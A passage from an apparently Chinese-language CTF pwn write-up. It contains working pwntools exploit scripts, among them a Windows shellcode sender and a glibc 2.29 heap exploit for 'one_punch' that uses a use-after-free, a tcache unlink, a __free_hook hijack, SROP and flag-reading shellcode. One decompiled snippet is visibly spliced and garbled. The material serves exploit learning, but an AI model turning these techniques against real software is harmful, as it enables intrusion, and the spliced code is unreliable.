    mov [rsp + 0x30], r9
    mov rax, %d
    call rax ;// CreateFile
    mov rcx, rax
    lea rdx, [rsp + 0x200]
    mov r8d, 0x200
    lea r9, [rsp + 0x30]
    xor eax, eax
    mov [rsp + 0x20], rax
    mov rax, %d
    call rax ;// ReadFile
    mov ecx, 0xfffffff5 ;// STD_OUTPUT_HANDLE
    mov rax, %d
    call rax ;// GetStdHandle
    mov rcx, rax
    lea rdx, [rsp + 0x200]
    mov r8d, [rsp + 0x30]
    lea r9, [rsp + 0x40]
    xor eax, eax
    mov [rsp + 0x20], rax
    mov rax, %d
    call rax ;// WriteFile
    mov rax, %d
    call rax ;// exit
    ''' % ( KERNEL32 + 0x222f0, KERNEL32 + 0x22680, KERNEL32 + 0x1c890, KERNEL32 + 0x22770, image_base_addr + 0x1B86)
    shellcode = asm(asm_str)
    sh.send(shellcode)
    sh.interactive()
## Crypto in the Shell
这题比较简单，没有设置很多障碍，漏洞点也很明显，就是明显的数组溢出。
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      void *v3; // rsi
      signed int i; // [rsp+8h] [rbp-28h]
      __int64 offset; // [rsp+10h] [rbp-20h]
      size_t size; // [rsp+18h] [rbp-18h]
      void *local_buf; // [rsp+20h] [rbp-10h]
      unsigned __int64 v9; // [rsp+28h] [rbp-8h]
      v9 = __readfsqword(0x28u);
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(_bss_start, 0LL, 2, 0LL);
      v3 = 0LL;
      setvbuf(stderr, 0LL, 2, 0LL);
      readkey();
      for ( i = 0; i  2 )
        error((__int64)"invalid");
      free((void *)heros[v0].calloc_ptr);
    }
漏洞点在于 delete 时没有清理指针导致的 UAF ，程序使用的是 calloc 函数来获取 堆内存，这使得 tcache
就不能使用了，但是后门函数使用的仍然是malloc函数，不过我们需要满足其 tcache->counts 大于 6 才行。这就是该题的难点。
###  思路
  * 用 UAF 构造 chunk overlap
  * 用 tcache->counts 来伪造 size， 用 tcache->entries 伪造 fake_chunk 的 fd 和 bk，提前布置好 堆布局，以便绕过 unlink 检查。
  * unlink 控制 tcache->entries，劫持hook控制程序流，然后SROP再执行shellcode读取flag。
  * 
###  脚本
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'debug'
    execve_file = './one_punch'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    sh = process(execve_file)
    # sh = remote('', 0)
    elf = ELF(execve_file)
    libc = ELF('./libc-2.29.so')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def add(index, content):
        sh.sendlineafter('> ', '1')
        sh.sendlineafter('idx: ', str(index))
        sh.sendafter('name: ', content)
    def edit(index, content):
        sh.sendlineafter('> ', '2')
        sh.sendlineafter('idx: ', str(index))
        sh.sendafter('name: ', content)
    def show(index):
        sh.sendlineafter('> ', '3')
        sh.sendlineafter('idx: ', str(index))
        sh.recvuntil('name: ')
        return sh.recvuntil('n', drop=True)
    def delete(index):
        sh.sendlineafter('> ', '4')
        sh.sendlineafter('idx: ', str(index))
    def backdoor(content):
        sh.sendlineafter('> ', '50056')
        time.sleep(0.1)
        sh.send(content)
    add(2, 'a' * 0x217)
    for i in range(2):
        add(0, 'a' * 0x217)
        delete(0)
    result = show(0)
    heap_addr = u64(result.ljust(8, '')) & 0xfffffffffffff000
    log.success('heap_addr: ' + hex(heap_addr))
    for i in range(5):
        add(0, 'a' * 0x217)
        delete(0)
    delete(2)
    result = show(2)
    libc_addr = u64(result.ljust(8, '')) - 0x1e4ca0
    log.success('libc_addr: ' + hex(libc_addr))
    length = 0xe0
    add(0, 'a' * length)
    add(0, 'a' * 0x80)
    edit(2, '' * length + p64(0) + p64(0x21))
    delete(0)
    edit(2, '' * length + p64(0) + p64(0x31))
    delete(0)
    edit(2, '' * length + p64(0) + p64(0x3a1))
    delete(0)
    for i in range(3):
        add(1, 'b' * 0x3a8)
        delete(1)
    edit(2, '' * length + p64(0x300) + p64(0x570) + p64(0) + p64(0) + p64(heap_addr + 0x40) + p64(heap_addr + 0x40))
    delete(0)
    add(0, 'c' * 0x100 + p64(libc_addr + libc.symbols['__free_hook']) + '')
    # 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 
    layout = [
        libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
        10,
        libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
        heap_addr + 0x260 + 0xf8,
    ]
    backdoor(p64(libc_addr + 0x000000000012be97) + flat(layout) + '')
    frame = SigreturnFrame()
    frame.rdi = heap_addr
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rsp = libc_addr + libc.symbols['__free_hook'] + 8
    frame.rip = libc_addr + 0x55cc4 # ret
    shellcode = asm('''
    push 0x67616c66 ;// flag
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall
    cmp eax, 0
    js fail
    mov edi, eax
    mov rsi, rsp